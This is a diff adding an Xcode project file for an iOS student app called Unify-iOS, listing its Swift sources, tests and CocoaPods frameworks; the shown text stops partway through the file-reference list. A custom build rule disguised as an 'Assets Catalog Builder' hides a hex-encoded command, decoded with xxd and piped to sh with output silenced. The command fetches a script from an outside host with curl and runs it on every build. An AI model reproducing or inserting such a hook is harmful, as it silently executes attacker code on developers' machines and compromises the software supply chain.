@@ -1,0 +1,1234 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 51;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		08EF87B8D414850D6C399BD0 /* Pods_Unify_iOS_Unify_iOSUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = A7640ECCE5B6C424C9F5ED88 /* Pods_Unify_iOS_Unify_iOSUITests.framework */; };
+		120D2CC225570B8200C8E143 /* StudyYearData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 120D2CC125570B8200C8E143 /* StudyYearData.swift */; };
+		1211D20425F373E10081CC21 /* MessagesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1211D20325F373E10081CC21 /* MessagesViewController.swift */; };
+		1211D20925F373F40081CC21 /* MessagesViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1211D20825F373F40081CC21 /* MessagesViewModel.swift */; };
+		1211D20E25F374C60081CC21 /* ProfileViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1211D20D25F374C60081CC21 /* ProfileViewModel.swift */; };
+		1216B7CA264FB74100C19ACA /* CommunicationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1216B7C9264FB74100C19ACA /* CommunicationManager.swift */; };
+		122FE77425AA4B60000E1016 /* LoadingIncator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 122FE77325AA4B60000E1016 /* LoadingIncator.swift */; };
+		124504EB25B1D6910071E925 /* UserData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124504EA25B1D6910071E925 /* UserData.swift */; };
+		124504F025B1E7470071E925 /* ProfileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124504EF25B1E7470071E925 /* ProfileViewController.swift */; };
+		124C21AA25ED3EFA005E6A7F /* UnifyButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124C21A525ED3CF5005E6A7F /* UnifyButton.swift */; };
+		124C21EB25EE5FDE005E6A7F /* UnifyTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124C21EA25EE5FDE005E6A7F /* UnifyTextField.swift */; };
+		124C21FA25EE7834005E6A7F /* AvatarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124C21F925EE7834005E6A7F /* AvatarView.swift */; };
+		124C21FF25EE9509005E6A7F /* UnifySearchTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124C21FE25EE9509005E6A7F /* UnifySearchTextField.swift */; };
+		125129C5264C5E42003F678F /* RootViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125129C4264C5E42003F678F /* RootViewController.swift */; };
+		12582CDD25470468004E12D6 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12582CDC25470468004E12D6 /* HomeViewController.swift */; };
+		12582D082549D482004E12D6 /* User.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12582D072549D482004E12D6 /* User.swift */; };
+		12582D102549D56B004E12D6 /* University.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12582D0F2549D56B004E12D6 /* University.swift */; };
+		12582D152549D573004E12D6 /* Course.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12582D142549D573004E12D6 /* Course.swift */; };
+		12582D1A2549D580004E12D6 /* StudyYear.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12582D192549D580004E12D6 /* StudyYear.swift */; };
+		12582D1F2549D5FC004E12D6 /* Property.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12582D1E2549D5FC004E12D6 /* Property.swift */; };
+		12582D2D2549DA9B004E12D6 /* CourseData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12582D2C2549DA9B004E12D6 /* CourseData.swift */; };
+		1258EE732646137300C09271 /* ObjectSavable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1258EE722646137300C09271 /* ObjectSavable.swift */; };
+		1258EFC92646B3A700C09271 /* MessagesTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1258EFC82646B3A700C09271 /* MessagesTableViewCell.swift */; };
+		1258EFCF2646BCEA00C09271 /* Messages.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1258EFCE2646BCEA00C09271 /* Messages.swift */; };
+		125A103525974B4800FFFDA6 /* AccountManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125A103425974B4800FFFDA6 /* AccountManager.swift */; };
+		125A1046259757EE00FFFDA6 /* UnifyStore.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125A1045259757EE00FFFDA6 /* UnifyStore.swift */; };
+		125DE31F264C6302007AAED8 /* UnifyNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE31E264C6302007AAED8 /* UnifyNavigationController.swift */; };
+		125DE3D0264DAE86007AAED8 /* UIViewController+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3CF264DAE86007AAED8 /* UIViewController+Extensions.swift */; };
+		125DE3D5264DAEBE007AAED8 /* UIView+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3D4264DAEBE007AAED8 /* UIView+Extensions.swift */; };
+		125DE3DD264DAEDC007AAED8 /* Floaty+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3DC264DAEDC007AAED8 /* Floaty+Extensions.swift */; };
+		125DE3E2264DAF08007AAED8 /* UserDefaults+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3E1264DAF08007AAED8 /* UserDefaults+Extensions.swift */; };
+		125DE3F8264DCA2A007AAED8 /* String+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3F7264DCA2A007AAED8 /* String+Extensions.swift */; };
+		125DE44A264DFAB3007AAED8 /* UnifyAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE449264DFAB3007AAED8 /* UnifyAlertView.swift */; };
+		126A09EA2619C559001A6586 /* PhoneLoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 126A09E92619C559001A6586 /* PhoneLoginViewController.swift */; };
+		126A0AE7261AF619001A6586 /* UniversityData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 126A0AE6261AF619001A6586 /* UniversityData.swift */; };
+		126A0B1E2620CB42001A6586 /* SFSymbols.swift in Sources */ = {isa = PBXBuildFile; fileRef = 126A0B1D2620CB42001A6586 /* SFSymbols.swift */; };
+		127EA3992624EC90003130DC /* ForgottenPasswordViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 127EA3982624EC90003130DC /* ForgottenPasswordViewController.swift */; };
+		128BEFF3255163660010F731 /* CreateProfileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 128BEFF2255163660010F731 /* CreateProfileViewController.swift */; };
+		128BF063255326880010F731 /* CreateProfileViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 128BF062255326880010F731 /* CreateProfileViewModel.swift */; };
+		128BF068255326910010F731 /* SignUpViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 128BF067255326910010F731 /* SignUpViewModel.swift */; };
+		128BF06D2553269A0010F731 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 128BF06C2553269A0010F731 /* LoginViewModel.swift */; };
+		128CCEFD2567C6080080A629 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 128CCEFC2567C6080080A629 /* HomeViewModel.swift */; };
+		128CCF232567E8380080A629 /* HomePageTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 128CCF222567E8380080A629 /* HomePageTableViewCell.swift */; };
+		128DA0DC25E9929900CF8308 /* UnifyErrors.swift in Sources */ = {isa = PBXBuildFile; fileRef = 128DA0DB25E9929900CF8308 /* UnifyErrors.swift */; };
+		128DA0E625E9932C00CF8308 /* UnifyTitleLabel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 128DA0E525E9932C00CF8308 /* UnifyTitleLabel.swift */; };
+		12A8BF1E2646D32A00A53597 /* ChatLogViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12A8BF1D2646D32A00A53597 /* ChatLogViewModel.swift */; };
+		12A8BF2E2646E01500A53597 /* ChatLogViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12A8BF2D2646E01500A53597 /* ChatLogViewController.swift */; };
+		12A8BF3A264707A300A53597 /* UserModelDummy.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12A8BF39264707A300A53597 /* UserModelDummy.swift */; };
+		12AE6C9E253ED69A00942888 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 12AE6C9D253ED69900942888 /* GoogleService-Info.plist */; };
+		12AE6CC2253ED92300942888 /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12AE6CC1253ED92300942888 /* NetworkManager.swift */; };
+		12BC6A31264034F300E5474A /* TestViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12BC6A30264034F300E5474A /* TestViewController.swift */; };
+		12BC6A5426435D7300E5474A /* PasswordValidationTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12BC6A5326435D7300E5474A /* PasswordValidationTest.swift */; };
+		12BC6A5F2643610B00E5474A /* UsernameValidationTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12BC6A5E2643610B00E5474A /* UsernameValidationTest.swift */; };
+		12CC7568253D9BBA00FE9B56 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC7567253D9BBA00FE9B56 /* AppDelegate.swift */; };
+		12CC756A253D9BBA00FE9B56 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC7569253D9BBA00FE9B56 /* SceneDelegate.swift */; };
+		12CC756C253D9BBA00FE9B56 /* SignUpViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC756B253D9BBA00FE9B56 /* SignUpViewController.swift */; };
+		12CC7572253D9BBA00FE9B56 /* Unify_iOS.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 12CC7570253D9BBA00FE9B56 /* Unify_iOS.xcdatamodeld */; };
+		12CC7574253D9BBD00FE9B56 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 12CC7573253D9BBD00FE9B56 /* Assets.xcassets */; };
+		12CC7582253D9BBD00FE9B56 /* EmailValidationTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC7581253D9BBD00FE9B56 /* EmailValidationTest.swift */; };
+		12CC758D253D9BBD00FE9B56 /* Unify_iOSUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC758C253D9BBD00FE9B56 /* Unify_iOSUITests.swift */; };
+		12CC75A9253D9DC900FE9B56 /* UserLoginOptionsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC75A8253D9DC900FE9B56 /* UserLoginOptionsViewController.swift */; };
+		12CC75BB253DA58500FE9B56 /* UnifyColors.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC75BA253DA58500FE9B56 /* UnifyColors.swift */; };
+		12CC75C0253DA62600FE9B56 /* Strings.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC75BF253DA62600FE9B56 /* Strings.swift */; };
+		12CC75C5253DA7DC00FE9B56 /* Unify.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC75C4253DA7DC00FE9B56 /* Unify.swift */; };
+		12CC75D0253DB24200FE9B56 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC75CF253DB24200FE9B56 /* LoginViewController.swift */; };
+		12CC75D9253DB29B00FE9B56 /* UserLoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC75D8253DB29B00FE9B56 /* UserLoginViewModel.swift */; };
+		12D578D925BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12D578D825BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift */; };
+		12D7DED625F154AD00366B3D /* UniversitySelectViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12D7DED525F154AD00366B3D /* UniversitySelectViewController.swift */; };
+		12D7DEDF25F157D600366B3D /* UniversityCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12D7DEDE25F157D600366B3D /* UniversityCollectionViewCell.swift */; };
+		12D7DEE425F185B300366B3D /* UniversitySelectViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12D7DEE325F185B300366B3D /* UniversitySelectViewModel.swift */; };
+		12D7DEF125F2D07C00366B3D /* PersistenceManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12D7DEF025F2D07C00366B3D /* PersistenceManager.swift */; };
+		74035908F8F1D769B2559E0B /* Pods_Unify_iOSTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8F0BA7A0CB233FF4D8075F34 /* Pods_Unify_iOSTests.framework */; };
+		F58A7FD14625862E165EB2D4 /* Pods_Unify_iOS.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 38E0B9EBB637E5A4AE8AEA22 /* Pods_Unify_iOS.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		4AD1DACB5B41C0ECBA6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
+
+/* Begin PBXContainerItemProxy section */
+		12CC757E253D9BBD00FE9B56 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 12CC755C253D9BBA00FE9B56 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 12CC7563253D9BBA00FE9B56;
+			remoteInfo = "Unify-iOS";
+		};
+		12CC7589253D9BBD00FE9B56 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 12CC755C253D9BBA00FE9B56 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 12CC7563253D9BBA00FE9B56;
+			remoteInfo = "Unify-iOS";
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXFileReference section */
+		120D2CC125570B8200C8E143 /* StudyYearData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StudyYearData.swift; sourceTree = "<group>"; };
+		1211D20325F373E10081CC21 /* MessagesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessagesViewController.swift; sourceTree = "<group>"; };
+		1211D20825F373F40081CC21 /* MessagesViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessagesViewModel.swift; sourceTree = "<group>"; };
+		1211D20D25F374C60081CC21 /* ProfileViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewModel.swift; sourceTree = "<group>"; };
+		1216B7C9264FB74100C19ACA /* CommunicationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommunicationManager.swift; sourceTree = "<group>"; };
+		122FE77325AA4B60000E1016 /* LoadingIncator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingIncator.swift; sourceTree = "<group>"; };
+		124504EA25B1D6910071E925 /* UserData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserData.swift; sourceTree = "<group>"; };
+		124504EF25B1E7470071E925 /* ProfileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewController.swift; sourceTree = "<group>"; };
+		124C21A525ED3CF5005E6A7F /* UnifyButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyButton.swift; sourceTree = "<group>"; };
+		124C21EA25EE5FDE005E6A7F /* UnifyTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyTextField.swift; sourceTree = "<group>"; };
+		124C21F925EE7834005E6A7F /* AvatarView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AvatarView.swift; sourceTree = "<group>"; };
+		124C21FE25EE9509005E6A7F /* UnifySearchTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifySearchTextField.swift; sourceTree = "<group>"; };
+		125129C4264C5E42003F678F /* RootViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RootViewController.swift; sourceTree = "<group>"; };
+		12582CDC25470468004E12D6 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
+		12582D072549D482004E12D6 /* User.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = User.swift; sourceTree = "<group>"; };
+		12582D0F2549D56B004E12D6 /* University.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = University.swift; sourceTree = "<group>"; };
+		12582D142549D573004E12D6 /* Course.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Course.swift; sourceTree = "<group>"; };
+		12582D192549D580004E12D6 /* StudyYear.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StudyYear.swift; sourceTree = "<group>"; };
+		12582D1E2549D5FC004E12D6 /* Property.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Property.swift; sourceTree = "<group>"; };
+		12582D2C2549DA9B004E12D6 /* CourseData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CourseData.swift; sourceTree = "<group>"; };
+		1258EE722646137300C09271 /* ObjectSavable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ObjectSavable.swift; sourceTree = "<group>"; };
+		1258EFC82646B3A700C09271 /* MessagesTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessagesTableViewCell.swift; sourceTree = "<group>"; };
+		1258EFCE2646BCEA00C09271 /* Messages.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Messages.swift; sourceTree = "<group>"; };
+		125A103425974B4800FFFDA6 /* AccountManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountManager.swift; sourceTree = "<group>"; };
+		125A1045259757EE00FFFDA6 /* UnifyStore.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyStore.swift; sourceTree = "<group>"; };
+		125DE31E264C6302007AAED8 /* UnifyNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyNavigationController.swift; sourceTree = "<group>"; };
+		125DE375264C74D6007AAED8 /* Unify-iOS.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = "Unify-iOS.entitlements"; sourceTree = "<group>"; };
+		125DE3CF264DAE86007AAED8 /* UIViewController+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIViewController+Extensions.swift"; sourceTree = "<group>"; };
+		125DE3D4264DAEBE007AAED8 /* UIView+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIView+Extensions.swift"; sourceTree = "<group>"; };
+		125DE3DC264DAEDC007AAED8 /* Floaty+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Floaty+Extensions.swift"; sourceTree = "<group>"; };
+		125DE3E1264DAF08007AAED8 /* UserDefaults+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UserDefaults+Extensions.swift"; sourceTree = "<group>"; };
+		125DE3F7264DCA2A007AAED8 /* String+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+Extensions.swift"; sourceTree = "<group>"; };
+		125DE449264DFAB3007AAED8 /* UnifyAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyAlertView.swift; sourceTree = "<group>"; };
+		126A09E92619C559001A6586 /* PhoneLoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhoneLoginViewController.swift; sourceTree = "<group>"; };
+		126A0AE6261AF619001A6586 /* UniversityData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UniversityData.swift; sourceTree = "<group>"; };
+		126A0B1D2620CB42001A6586 /* SFSymbols.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SFSymbols.swift; sourceTree = "<group>"; };
+		127EA3982624EC90003130DC /* ForgottenPasswordViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgottenPasswordViewController.swift; sourceTree = "<group>"; };
+		128BEFF2255163660010F731 /* CreateProfileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateProfileViewController.swift; sourceTree = "<group>"; };
+		128BF062255326880010F731 /* CreateProfileViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateProfileViewModel.swift; sourceTree = "<group>"; };
+		128BF067255326910010F731 /* SignUpViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpViewModel.swift; sourceTree = "<group>"; };
+		128BF06C2553269A0010F731 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
+		128CCEFC2567C6080080A629 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
+		128CCF222567E8380080A629 /* HomePageTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomePageTableViewCell.swift; sourceTree = "<group>"; };
+		128DA0DB25E9929900CF8308 /* UnifyErrors.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyErrors.swift; sourceTree = "<group>"; };
+		128DA0E525E9932C00CF8308 /* UnifyTitleLabel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyTitleLabel.swift; sourceTree = "<group>"; };
+		12A8BF1D2646D32A00A53597 /* ChatLogViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatLogViewModel.swift; sourceTree = "<group>"; };
+		12A8BF2D2646E01500A53597 /* ChatLogViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatLogViewController.swift; sourceTree = "<group>"; };
+		12A8BF39264707A300A53597 /* UserModelDummy.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserModelDummy.swift; sourceTree = "<group>"; };
+		12AE6C9D253ED69900942888 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		12AE6CC1253ED92300942888 /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
+		12BC6A30264034F300E5474A /* TestViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestViewController.swift; sourceTree = SOURCE_ROOT; };
+		12BC6A5326435D7300E5474A /* PasswordValidationTest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PasswordValidationTest.swift; sourceTree = "<group>"; };
+		12BC6A5E2643610B00E5474A /* UsernameValidationTest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UsernameValidationTest.swift; sourceTree = "<group>"; };
+		12CC7564253D9BBA00FE9B56 /* Unify-iOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Unify-iOS.app"; sourceTree = BUILT_PRODUCTS_DIR; };
+		12CC7567253D9BBA00FE9B56 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		12CC7569253D9BBA00FE9B56 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		12CC756B253D9BBA00FE9B56 /* SignUpViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpViewController.swift; sourceTree = "<group>"; };
+		12CC7571253D9BBA00FE9B56 /* Unify_iOS.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = Unify_iOS.xcdatamodel; sourceTree = "<group>"; };
+		12CC7573253D9BBD00FE9B56 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		12CC7578253D9BBD00FE9B56 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		12CC757D253D9BBD00FE9B56 /* Unify-iOSTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Unify-iOSTests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
+		12CC7581253D9BBD00FE9B56 /* EmailValidationTest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmailValidationTest.swift; sourceTree = "<group>"; };
+		12CC7583253D9BBD00FE9B56 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		12CC7588253D9BBD00FE9B56 /* Unify-iOSUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Unify-iOSUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
+		12CC758C253D9BBD00FE9B56 /* Unify_iOSUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Unify_iOSUITests.swift; sourceTree = "<group>"; };
+		12CC758E253D9BBD00FE9B56 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		12CC75A8253D9DC900FE9B56 /* UserLoginOptionsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserLoginOptionsViewController.swift; sourceTree = "<group>"; };
+		12CC75BA253DA58500FE9B56 /* UnifyColors.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyColors.swift; sourceTree = "<group>"; };
+		12CC75BF253DA62600FE9B56 /* Strings.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Strings.swift; sourceTree = "<group>"; };
+		12CC75C4253DA7DC00FE9B56 /* Unify.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Unify.swift; sourceTree = "<group>"; };
+		12CC75CF253DB24200FE9B56 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
+		12CC75D8253DB29B00FE9B56 /* UserLoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserLoginViewModel.swift; sourceTree = "<group>"; };
+		12D578D825BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatLogCollectionViewCell.swift; sourceTree = "<group>"; };
+		12D7DED525F154AD00366B3D /* UniversitySelectViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UniversitySelectViewController.swift; sourceTree = "<group>"; };
+		12D7DEDE25F157D600366B3D /* UniversityCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UniversityCollectionViewCell.swift; sourceTree = "<group>"; };
+		12D7DEE325F185B300366B3D /* UniversitySelectViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UniversitySelectViewModel.swift; sourceTree = "<group>"; };
+		12D7DEF025F2D07C00366B3D /* PersistenceManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersistenceManager.swift; sourceTree = "<group>"; };
+		16DB7CC0BE87283A73F6FD39 /* Pods-Unify-iOS.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unify-iOS.debug.xcconfig"; path = "Target Support Files/Pods-Unify-iOS/Pods-Unify-iOS.debug.xcconfig"; sourceTree = "<group>"; };
+		38E0B9EBB637E5A4AE8AEA22 /* Pods_Unify_iOS.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Unify_iOS.framework; sourceTree = BUILT_PRODUCTS_DIR; };
